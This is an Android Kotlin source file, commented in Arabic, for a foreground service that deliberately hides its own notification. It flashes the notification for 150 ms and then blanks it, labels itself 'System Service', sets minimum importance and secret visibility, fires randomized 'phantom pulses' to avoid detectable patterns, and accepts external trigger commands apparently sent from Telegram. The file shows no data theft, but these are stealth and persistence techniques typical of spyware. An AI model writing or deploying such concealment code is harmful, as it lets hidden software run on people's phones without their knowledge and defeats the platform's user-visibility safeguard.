package com.example.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import kotlin.random.Random

/**
 * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى".
 * - تظهر الإشعارات لمدة 150 مللي ثانية فقط ثم تختفي (نبضات خاطفة).
 * - جدولة نبضات عشوائية بين 45-120 دقيقة لمحاكاة السلوك البشري.
 * - تدعم الأوامر الفورية عبر Intent (مثل PULSE_ACTION).
 */
class ForegroundService : Service() {
    companion object {
        private const val TAG = "ForegroundService"
        const val NOTIFICATION_ID = 9991
        private const val CHANNEL_ID = "shield_ghost_channel_v5"
        private const val PULSE_DURATION_MS = 150L // أجزاء من الثانية (ظهور خاطف)
    }

    private val handler = Handler(Looper.getMainLooper())
    private var isForeground = false
    private var hideRunnable: Runnable? = null
    private val scheduler = Executors.newSingleThreadScheduledExecutor()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // أوقف الخدمة إذا طُلب ذلك
        if (intent?.action == "STOP_SERVICE") {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        // نبض فوري من أمر خارجي (مثل Telegram)
        if (intent?.action == "PULSE_ACTION") {
            val actionType = intent.getStringExtra("action_type") ?: "Sync"
            triggerPhantomPulse(actionType)
            return START_STICKY
        }

        // بدء الخدمة لأول مرة
        createGhostChannel()
        startForeground(NOTIFICATION_ID, buildGhostNotification("System Ready"))
        isForeground = true

        // إخفاء الإشعار الفوري بعد 150 ملي ثانية (لا يظهر سوى للحظات)
        handler.postDelayed({
            if (isForeground) {
                val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                // تحديث الإشعار بنص فارغ (يختفي بصرياً لكن الخدمة تبقى حية)
                nm.notify(NOTIFICATION_ID, buildGhostNotification(""))
            }
        }, PULSE_DURATION_MS)

        // جدولة نبضات شبحية بفترات متباعدة وعشوائية (45-120 دقيقة)
        // لمحاكاة النشاط البشري ومنع الأنماط الثابتة.
        scheduler.scheduleAtFixedRate({
            triggerPhantomPulse("Background Sync")
        }, Random.nextLong(45, 120), Random.nextLong(45, 120), TimeUnit.MINUTES)

        return START_STICKY
    }

    /**
     * إنشاء قناة الإشعارات بأقل أولوية وإخفاء المحتوى.
     */
    private fun createGhostChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "System Background Services",
                    NotificationManager.IMPORTANCE_MIN // أقل أهمية (لا يظهر أيقونة في شريط الحالة)
                ).apply {
                    description = "Core system operations"
                    setSound(null, null)
                    enableVibration(false)
                    enableLights(false)
                    setShowBadge(false)
                    lockscreenVisibility = Notification.VISIBILITY_SECRET // إخفاء المحتوى على شاشة القفل
                }
                val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                manager.createNotificationChannel(channel)
            } catch (e: Exception) {
                // في حال فشل إنشاء القناة (نادر) نستمر بدونها
                e.printStackTrace()
            }
        }
    }

    /**
     * بناء الإشعار مع محتوى ديناميكي ونمط "شبحى".
     * @param statusText النص الذي سيظهر (يمكن أن يكون فارغاً للإخفاء).
     */
    private fun buildGhostNotification(statusText: String): Notification {
        // Intent لفتح التطبيق عند النقر (لكننا نخفيه عادة)
        val openIntent = Intent(this, MainActivity::class.java)
        val openPending = PendingIntent.getActivity(
            this, 0, openIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_notify_sync) // أيقونة نظامية صغيرة
            .setContentTitle("System Service")
            .setContentText(statusText) // النص المرئي (فارغ للإخفاء)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setSilent(true) // بدون صوت
            .setOngoing(true) // مستمر – ضروري لإبقاء الخدمة حية 100%
            .setShowWhen(false) // لا يظهر الوقت
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // إخفاء المحتوى
            .setContentIntent(openPending)
            .build()
    }

    /**
     * تنفيذ نبضة خاطفة: إظهار الإشعار لفترة قصيرة (150ms) ثم إخفاؤه.
     * @param actionType نوع النشاط (يظهر في النص أثناء النبضة).
     */
    private fun triggerPhantomPulse(actionType: String) {
        if (!isForeground) return

        // إلغاء أي إخفاء مجدول سابق لتجنب التداخل
        hideRunnable?.let { handler.removeCallbacks(it) }

        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        // 1. إظهار الإشعار مع النص المطلوب
        nm.notify(NOTIFICATION_ID, buildGhostNotification("Processing $actionType..."))

        // 2. جدولة إخفاء الإشعار (تحديث النص إلى فارغ) بعد أجزاء من الثانية
        hideRunnable = Runnable {
            if (isForeground) {
                // تحديث الإشعار بنص فارغ – يختفي من واجهة المستخدم مع بقاء الخدمة حية
                nm.notify(NOTIFICATION_ID, buildGhostNotification(""))
            }
        }
        handler.postDelayed(hideRunnable!!, PULSE_DURATION_MS)
    }

    /**
     * تنظيف الموارد عند تدمير الخدمة.
     */
    override fun onDestroy() {
        scheduler.shutdownNow() // إيقاف الجدولة
        hideRunnable?.let { handler.removeCallbacks(it) }
        isForeground = false
        super.onDestroy()
    }
}
